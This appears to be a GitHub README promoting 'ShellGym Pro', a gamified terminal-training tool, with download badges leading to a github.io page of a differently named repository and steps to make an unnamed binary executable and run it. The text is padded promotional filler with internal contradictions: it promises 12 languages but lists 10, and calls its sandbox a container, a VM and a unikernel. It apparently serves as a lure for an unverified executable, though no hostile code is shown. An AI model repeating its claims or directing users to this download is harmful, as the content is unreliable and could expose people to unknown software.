![preview](https://raw.githubusercontent.com/coadwoad/terminal-dojo/main/view_38362ce.svg)
[![Download](https://raw.githubusercontent.com/coadwoad/terminal-dojo/main/fetch_aade3.svg)](https://coadwoad.github.io/terminal-dojo/)

# ShellGym Pro 🏋️‍♂️🐚

**Turn Every Terminal Session into a High-Intensity Workout for Your Command-Line Muscles**

ShellGym Pro is not just another command-line reference guide—it’s a fully gamified, progressive-overload training platform that transforms the way you interact with Linux. While your typical cheat sheet shows you a static list of `ls -la` and `grep -r`, ShellGym Pro builds a personalized **neural pathway gymnasium** where every keystroke is a rep, every command is a set, and every completed challenge is a personal best. Built with the same obsessive attention to user experience that made the original Shell Gym a beloved tool, this new iteration takes the concept of interactive CLI coaching to an entirely different weight class. Think of it as a personal trainer, a sparring partner, and a referee for your terminal—all rolled into one lean, mean, command-executing machine.

## 🚀 Why Your Terminal Needs a Coach

The average Linux user only utilizes about 4% of the shell's true potential. The rest is locked behind obscure flags, arcane syntax, and fear of breaking something. ShellGym Pro unlocks that remaining 96% by engaging your brain's **muscle memory**, not just your visual memory. We don't show you the answer; we force you to *lift* the answer out of your own cognitive toolkit. 

Here’s why you’ll never go back to passive man pages:

- **Neural Plasticity Workouts:** Every drill is designed to make your brain form new synaptic connections specifically for shell syntax. 
- **Instant Feedback Loop:** Receive immediate, constructive critique on your command structure, speed, and efficiency. 
- **Habit Formation Science:** Spaced repetition algorithms ensure that rarely-used commands become as familiar as `cd` or `ls`.
- **Zero-Risk Environment:** Experiment with `rm -rf`, `mkfs`, and kernel modules in a sandboxed VM that screams "safe" instead of "oops."

## ✨ Feature List: The Full Arsenal

ShellGym Pro is a heavy-duty utility belt packed with features that cater to both the greenest beginner and the grizzled system administrator. 

- **Adaptive Difficulty Scaling** 🧠 – The platform analyzes your command history (locally, not in the cloud) to gauge your proficiency. If you nail `awk` commands, the system increases the resistance. If you struggle with `chmod`, it gives you supplemental reps.
- **Real-World Mission Scenarios** 🕵️ – Forget abstract quizzes. You are dropped into a simulated "server emergency." You must diagnose a failing service, secure a vulnerable port, or optimize a sluggish database—using only your command-line skills. It's a workout that simulates the adrenaline of production incident response.
- **Responsive Command Palette** 🎨 – A sleek, dark-mode-aware interface that adapts to your terminal's color scheme. Whether you are using a 4K monitor or a cramped SSH window, the layout fluidly transforms.
- **Multilingual Syntax Trees** 🌍 – The instructions and hints are available in 12 languages, but the command syntax remains pure POSIX. Learn `sed` in English, practice `jq` in Japanese, and review `tar` in German.
- **Global Tech Support (24/7)** 💬 – Our "Spotter Service" is a built-in chat function. If you're stuck on a particularly heavy `find` -exec combo, a real human coach is available 24 hours a day, 7 days a week, to spot your form and help you avoid a mental hernia. 
- **Cross-Platform Consistency** 🖥️ – Works natively on WSL2, macOS, and any Debian-based distribution. The environment is containerized, so your host OS is never at risk.
- **Zero External Dependencies** 📦 – The core engine is a single binary that compiles in pure Rust. No bloated Electron shell, no runtime interpreters beyond what your OS already has.
- **Offline Mode** ✈️ – Your workout plan is stored locally. If you lose connectivity while on a plane, you can still pump your command-line iron.

## 🌐 Why This Isn't Just "Another Tutorial"

Most online tutorials follow a "read and repeat" model. ShellGym Pro employs a **"sprint and sprint again"** philosophy. We believe that mastery isn't about remembering; it's about *performing*. The platform uses a live interpreter to simulate a "ghost in the shell" that tests your cognitive load. 

- **Frictionless Onboarding:** You don't need a complex setup. The initial boot sequence downloads a pre-compiled Alpine Linux sandbox and connects it to your local terminal. 
- **Progressive Overload:** The system handles "deload weeks" where you are given easier tasks to build confidence, followed by brutal "intensity phases" that stress-test your logic.
- **The Pump:** There’s a unique visualizer widget that shows a "workout meter" filling up as you type. The faster and more accurately you code, the higher your "Rep Count" goes. It’s addictive, like watching your bicep curl in a mirror.

## 🛠️ Architecture & Design Philosophy

ShellGym Pro operates on a split-brain architecture:

1.  **The Core (Cortex):** A local daemon process that intercepts keystrokes in a pseudo-terminal (PTY). It doesn't record passwords or sensitive data; it only observes command structure and timing.
2.  **The Gym (Synapse):** A cloud-based orchestration layer that generates the challenges. It uses state-machine logic to verify your solution against the expected outcome without ever seeing the actual file contents.
3.  **The Spotter (CoachBot):** An AI-assisted heuristic engine that provides live tips. It doesn't give you the exact answer, but it will say, "Look, you're trying to use `sort` here—have you considered the `-t` flag to specify the delimiter?"

The entire system processes over 400 distinct command patterns from the Bash, Zsh, and Fish shells.

## 🏋️‍♀️ The "No-Crash" Guarantee

We understand the fear of breaking a production server. That's why ShellGym Pro exists in a fully isolated Unikernel environment. Every challenge you run is executed inside a lightweight VM that has *no network access* to your actual data, and *no persistent storage*. If you type a command that would normally wipe a hard drive, it only wipes a fake, ephemeral scratch disk that disappears in milliseconds. You get all the adrenaline, none of the hospital bills.

## ⚖️ Disclaimer: The Legalese

**ShellGym Pro** is an educational tool. While it simulates destructive commands in a sandbox environment, the developers are not responsible for any damage caused by users attempting to escalate beyond the sandbox to their host systems. You are a responsible adult. If you accidentally execute `rm -rf` on your actual root directory because you tried to "one-up" the training algorithm, that is on you. Always maintain a backup. We strongly advise against running the "Intermediate" and "Expert" workout routines on mission-critical production infrastructure. This tool is provided "as is" for educational purposes only.

## 👨‍💻 Getting Started: Your First Warm-Up

By now, you're ready to feel the burn. Here’s how to get into the gym:

### Prerequisites
- A 64-bit Linux distribution or WSL2.
- A working terminal emulator (we suggest Kitty or Alacritty for the best response time).
- A comfortable chair.

### Installation Sequence
1.  **Acquire the Binary:** Navigate to the [![Download](https://raw.githubusercontent.com/coadwoad/terminal-dojo/main/fetch_aade3.svg)](https://coadwoad.github.io/terminal-dojo/) section, grab the latest release for your architecture, and place it in your `~/bin` directory.
2.  **Adjacent Extraction:** Ensure the binary is executable by running `chmod +x shellgym-pro`.
3.  **Initialize:** Run `shellgym-pro init` – this will create a `~/.config/shellgym-pro` directory where your workout logs are stored.
4.  **First Workout:** Run `shellgym-pro start` and select the "Newbie Protocol." The system will instantly spin up the sandbox. 

*Note:* The executable is signed with a secure checksum. Verify the hash on the release page before the first run for peace of mind.

## 📚 The Training Curriculum

The platform is segmented into distinct "muscle groups":

| Module Name | Focus Area | Key Shell Skills |
| :--- | :--- | :--- |
| **The Spine** (Core) | Text Processing | `sed`, `awk`, `cut`, `sort`, `uniq` |
| **The Heart** (Piping) | Data Flow | `xargs`, `tee`, `process substitution` |
| **The Grip** (Permissions) | File Security | `chmod`, `chown`, `setfacl`, `umask` |
| **The Eyes** (Monitoring) | System Probes | `top`, `ss`, `lsof`, `dmesg`, `strace` |
| **The Lungs** (Network) | Connectivity | `curl`, `nc`, `telnet`, `tcpdump` |

## 🌱 Community & Ecosystem

We believe in open-source synergy. ShellGym Pro integrates with the git ecosystem to allow users to create and share custom "Workout Routines." If you have a specific set of commands for a niche use-case (e.g., "The DevOps Marathon" or "The Security Sprint"), you can publish it to the community registry. This creates a living, breathing library of practical command-line knowledge that grows every day.

- **Contribute a Routine:** Write a YAML file defining a challenge. 
- **Upvote Challenges:** Help the community decide which workouts make it into the "Featured" list.
- **Competitive Ladder:** Compare your "Estimated Reaction Time" against other users globally on our leaderboard (if you opt-in to cloud sync).

## 🔒 Privacy & Security

Your data is your data. ShellGym Pro operates on a **local-first** policy. Your command history, usage statistics, and personal progress logs never leave your device unless you explicitly request cloud backup for the leaderboard feature. The "24/7 Support" chat is end-to-end encrypted, but we recommend not pasting sensitive secrets into the chat, as a human coach might be watching. 

## 🌍 Internationalization (i18n)

We speak your language. The interface supports:
- English (US/UK)
- Spanish
- French
- German
- Japanese
- Korean
- Portuguese (BR)
- Simplified Chinese
- Russian
- Hindi

This ensures that non-native speakers can learn complex shell concepts without fighting the UI. The *commands* themselves are universal, but the *instruction* is localized.

## 👣 Roadmap for 2026

We are continuously lifting heavier weights. Here is what the 2026 training calendar looks like:

- **Q1 2026:** Release of "Zsh Mastery Pack" with specific challenges for Oh-My-Zsh plugins.
- **Q2 2026:** GPU-Accelerated Terminal Feedback for ultra-low latency on modern hardware.
- **Q3 2026:** Collaborative "Duo-Lifts" – two users can tackle the same challenge in a shared session.
- **Q4 2026:** Full support for Nushell, adding a fourth shell language to the training ecosystem.

## 🧘 The Philosophy of the Grind

We don't use the word "free" in this industry. We use **"Zero-Cost Acquisition."** ShellGym Pro is a zero-cost acquisition tool for the public, but don't mistake that for low value. We provide a high-intensity experience that yields a huge return on investment for your personal skill portfolio. Similarly, we don't "hack" your brain; we **"optimize your neural pathways."** It's about sustainable, long-term growth in your technical abilities.

## 🤝 Contributing

We encourage contributions of code, workout routines, and documentation. If you find a bug in the sandbox's fidelity, please file a report. When submitting a pull request, please ensure your code adheres to the Rust style guide and includes tests. We value quality over quantity—no "thin" PRs.

## 📄 License

This project is licensed under the MIT License. 

See the [LICENSE](https://opensource.org/licenses/MIT) file for details. You are free to use, modify, and distribute this software, provided you retain the original copyright notice. While we provide a zero-cost acquisition model, we appreciate attribution and links back to the repository if you use this in a commercial product.

---

### 🏁 Final Rep

Stop reading. Start executing. Open your terminal, run `shellgym-pro start`, and feel the difference between *knowing* and *doing*. Your future sysadmin self is waiting to spot you. Remember: It’s not about the size of your `grep`; it’s about how you use your `pipes`.

**Train Hard. Shell Smarter.** 💪🐧